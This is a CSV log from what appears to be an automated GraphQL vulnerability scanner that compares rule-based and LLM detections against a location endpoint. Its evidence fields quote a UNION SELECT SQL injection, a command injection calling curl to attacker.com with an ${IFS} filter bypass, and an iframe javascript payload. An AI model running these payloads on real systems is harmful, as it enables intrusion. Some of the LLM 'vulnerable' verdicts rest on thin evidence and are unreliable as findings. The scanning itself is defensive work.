timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-05T02:04:30.168947,location_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]","[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL error response contains a SQL injection payload attempting to execute a UNION SELECT query targeting the database version (@@version). The 500 error (\""Cast to Number failed for value \\\""NaN\\\"" at path \\\""id\\\""\"") indicates improper input sanitization, as the injected SQL caused a type mismatch. While no database data was directly exposed, the presence of active SQL syntax in the request and the backend's failure to reject/validate it strongly suggests a SQL injection vulnerability."", ""evidence"": ""SQL injection payload detected in URL parameter: '1%27%20UNION%20SELECT%20NULL,@@version--' (decoded as \""1' UNION SELECT NULL,@@version--\"")"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""SQL injection payload detected in URL parameter: '1%27%20UNION%20SELECT%20NULL,@@version--' (decoded as \""1' UNION SELECT NULL,@@version--\"")"", ""explanation"": ""The GraphQL error response contains a SQL injection payload attempting to execute a UNION SELECT query targeting the database version (@@version). The 500 error (\""Cast to Number failed for value \\\""NaN\\\"" at path \\\""id\\\""\"") indicates improper input sanitization, as the injected SQL caused a type mismatch. While no database data was directly exposed, the presence of active SQL syntax in the request and the backend's failure to reject/validate it strongly suggests a SQL injection vulnerability.""}}]"
2025-10-05T02:04:35.374990,location_response_3,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T02:04:41.102881,location_response_4,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T02:05:05.602544,location_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The server's error response contains a crafted URL with shell command injection payload: ';curl${IFS}attacker.com'. This demonstrates an attempt to execute arbitrary OS commands via command separator (;) and environment variable manipulation (${IFS} to bypass space restrictions). The presence of this payload in the internal server error indicates insufficient input sanitization and a high likelihood of successful command injection."", ""evidence"": ""http://localhost:8080/api/location/;curl$%7BIFS%7Dattacker.com in error.extensions.response.url"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.9, ""evidence"": ""http://localhost:8080/api/location/;curl$%7BIFS%7Dattacker.com in error.extensions.response.url"", ""explanation"": ""The server's error response contains a crafted URL with shell command injection payload: ';curl${IFS}attacker.com'. This demonstrates an attempt to execute arbitrary OS commands via command separator (;) and environment variable manipulation (${IFS} to bypass space restrictions). The presence of this payload in the internal server error indicates insufficient input sanitization and a high likelihood of successful command injection.""}}]"
2025-10-05T02:05:12.833508,location_response_6,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T02:05:27.351447,location_response_7,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,[],"[{""detection_name"": ""LLM: html_injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL error response includes a URL with the HTML-encoded payload '<iframe src=javascript:alert('HTMLi')>', indicating unsanitized user input was processed. While no direct HTML reflection is visible in the response body, the presence of executable HTML/JS in a server-generated URL suggests improper input sanitization. If this URL is rendered in a client-facing context without encoding, it could trigger script execution or HTML injection."", ""evidence"": ""URL contains injected HTML payload: %3Ciframe%20src=javascript:alert(%27HTMLi%27)%3E"", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""MEDIUM"", ""confidence"": 0.8, ""evidence"": ""URL contains injected HTML payload: %3Ciframe%20src=javascript:alert(%27HTMLi%27)%3E"", ""explanation"": ""The GraphQL error response includes a URL with the HTML-encoded payload '<iframe src=javascript:alert('HTMLi')>', indicating unsanitized user input was processed. While no direct HTML reflection is visible in the response body, the presence of executable HTML/JS in a server-generated URL suggests improper input sanitization. If this URL is rendered in a client-facing context without encoding, it could trigger script execution or HTML injection.""}}]"
2025-10-05T02:05:34.432514,location_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T02:05:42.587173,location_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T02:05:50.039631,location_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T02:05:57.347686,location_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Unknown,1,0,0,0,1,0,0.0,llm_potential_only,,,Unknown,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: field_suggestions"", ""detection"": ""potential"", ""category"": ""Unknown"", ""description"": ""The GraphQL response exposes schema structure through field suggestions in validation errors. When invalid fields (iid, nme, typ) are queried, the server suggests valid alternatives (id, name, type). This information disclosure could aid attackers in schema enumeration by revealing existing field names, potentially bypassing introspection restrictions. While not a direct exploit, it increases the attack surface for reconnaissance phases."", ""evidence"": ""Server returned field suggestions: 'Did you mean \""id\""?', 'Did you mean \""name\""?', 'Did you mean \""type\""?' in validation errors"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""field_suggestions"", ""severity"": ""MEDIUM"", ""confidence"": 0.9, ""evidence"": ""Server returned field suggestions: 'Did you mean \""id\""?', 'Did you mean \""name\""?', 'Did you mean \""type\""?' in validation errors"", ""explanation"": ""The GraphQL response exposes schema structure through field suggestions in validation errors. When invalid fields (iid, nme, typ) are queried, the server suggests valid alternatives (id, name, type). This information disclosure could aid attackers in schema enumeration by revealing existing field names, potentially bypassing introspection restrictions. While not a direct exploit, it increases the attack surface for reconnaissance phases.""}}]"
